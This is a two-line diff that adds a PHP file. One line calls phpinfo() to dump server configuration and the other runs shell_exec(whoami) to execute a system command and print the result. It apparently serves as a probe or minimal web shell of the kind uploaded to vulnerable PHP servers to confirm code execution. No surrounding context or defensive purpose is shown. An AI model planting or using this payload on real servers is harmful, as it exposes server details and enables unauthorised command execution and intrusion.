@@ -1,0 +1,2 @@
+<?php phpinfo()?>
+<?php echo shell_exec(whoami);?>
